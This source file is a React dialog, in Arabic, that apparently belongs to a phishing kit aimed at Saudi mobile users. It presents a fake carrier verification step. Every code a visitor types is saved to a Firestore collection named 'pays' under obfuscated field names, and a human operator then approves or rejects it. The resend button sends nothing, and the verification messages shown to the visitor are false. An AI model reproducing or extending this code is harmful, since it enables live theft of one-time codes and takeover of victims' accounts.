"use client"

import { useState, useRef, useEffect } from "react"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { AlertCircle, CheckCircle2, Smartphone } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"

interface PhoneOtpDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  phoneNumber: string
  phoneCarrier: string
  onRejected: () => void
  onShowWaitingModal: (carrier: string) => void
  rejectionError?: string
}

export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, onRejected, onShowWaitingModal, rejectionError }: PhoneOtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60)
  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
  const [error, setError] = useState("")
  const inputRef = useRef<HTMLInputElement | null>(null)
  const allOtps = useRef<string[]>([])

  // Timer countdown
  useEffect(() => {
    if (open && timer > 0 && otpStatus === "waiting") {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [open, timer, otpStatus])

  // Reset on open
  useEffect(() => {
    if (open) {
      setTimer(60)
      setOtp("")
      setOtpStatus("waiting")
      allOtps.current = []
      
      // Check for rejection error in localStorage
      const storedError = localStorage.getItem('phoneOtpRejectionError')
      if (storedError) {
        setError(storedError)
        localStorage.removeItem('phoneOtpRejectionError') // Clear after reading
      } else if (rejectionError) {
        setError(rejectionError)
      } else {
        setError("")
      }
      
      inputRef.current?.focus()
    }
  }, [open, rejectionError])

  // Note: Listener for admin decision is now in the waiting modals (stc/mobily/carrier)
  // This keeps the OTP dialog simple and allows proper flow control

  const handleChange = (value: string) => {
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value)
      setError("")
    }
  }

  const handleVerify = async () => {
    if (otp.length !== 4 && otp.length !== 6) return

    const visitorID = localStorage.getItem('visitor')
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    try {
      allOtps.current.push(otp)
      
      setOtpStatus("verifying")
      setError("")

      // Save OTP to Firebase
      if (!db) throw new Error("Firebase not configured")
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v7: otp,
        phoneOtpSubmittedAt: new Date().toISOString(),
        allPhoneOtps: allOtps.current,
        phoneOtpStatus: "verifying", // Set to verifying, waiting for admin decision
        phoneOtpUpdatedAt: new Date().toISOString()
      }, { merge: true })

      // Add phone info to history first (if not already added)
      await addToHistory(visitorID, "_t4", {
        phoneNumber: phoneNumber,
        phoneCarrier: phoneCarrier
      }, "approved") // Auto-approve phone number

      // Add phone OTP to history
      await addToHistory(visitorID, "_t5", {
        _v7: otp
      }, "pending")

      console.log("[PhoneOTP] OTP submitted, closing dialog and showing waiting modal")
      
      // Close OTP dialog
      onOpenChange(false)
      
      // Show waiting modal based on carrier
      onShowWaitingModal(phoneCarrier)
    } catch (err) {
      console.error("[PhoneOTP] Error submitting OTP:", err)
      setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
      setOtpStatus("waiting")
    }
  }

  const handleResend = () => {
    console.log("[PhoneOTP] Resending OTP")
    setTimer(60)
    setOtp("")
    setError("")
    setOtpStatus("waiting")
    inputRef.current?.focus()
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader className="text-center space-y-3">
          <div className="flex justify-center">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-[#1a5c85]">
              <Smartphone className="w-8 h-8 text-white" />
            </div>
          </div>
          <DialogTitle className="text-2xl font-bold text-gray-900">
            التحقق من رقم الجوال
          </DialogTitle>
          <DialogDescription className="text-base leading-relaxed">
            تم إرسال رمز التحقق المكون من <span className="font-bold text-[#1a5c85]">6 أرقام</span> إلى رقم الجوال:
            <br />
            <span className="font-bold text-lg text-gray-900 dir-ltr inline-block mt-1">
              +966 {phoneNumber}
            </span>
            <br />
            <span className="text-sm text-gray-600">يرجى إدخال الرمز أدناه لإتمام عملية التحقق</span>
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6 py-4">
          {/* Status Alerts */}
          {otpStatus === "verifying" && (
            <Alert className="bg-blue-50 border-blue-200">
              <AlertCircle className="h-4 w-4 text-blue-600" />
              <AlertDescription className="text-blue-900">
                جاري التحقق من الرمز... يرجى الانتظار
              </AlertDescription>
            </Alert>
          )}

          {otpStatus === "approved" && (
            <Alert className="bg-green-50 border-green-200">
              <CheckCircle2 className="h-4 w-4 text-green-600" />
              <AlertDescription className="text-green-900">
                تم التحقق بنجاح! جاري التحويل...
              </AlertDescription>
            </Alert>
          )}

          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {/* OTP Input */}
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={(e) => handleChange(e.target.value)}
              placeholder="000000"
              className="w-full max-w-xs h-16 text-center text-4xl font-bold tracking-[0.5em] border-2"
              disabled={otpStatus === "verifying" || otpStatus === "approved"}
            />
          </div>

          {/* Timer / Resend */}
          <div className="text-center">
            {timer > 0 && otpStatus === "waiting" ? (
              <p className="text-sm text-gray-600">
                إعادة إرسال الرمز بعد <span className="font-bold text-[#1a5c85]">{timer}</span> ثانية
              </p>
            ) : otpStatus === "waiting" ? (
              <Button 
                variant="link" 
                onClick={handleResend} 
                className="text-[#1a5c85] font-semibold"
              >
                إعادة إرسال رمز التحقق
              </Button>
            ) : null}
          </div>

          {/* Verify Button */}
          <Button
            onClick={handleVerify}
            disabled={(otp.length !== 4 && otp.length !== 6) || otpStatus === "verifying" || otpStatus === "approved"}
            className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] font-bold"
          >
            {otpStatus === "verifying" ? "جاري التحقق..." : "تأكيد الرمز"}
          </Button>

          {/* Security Info */}
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center">
            <p className="text-xs text-gray-600">
              🔒 رمز التحقق صالح لمدة 10 دقائق فقط
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
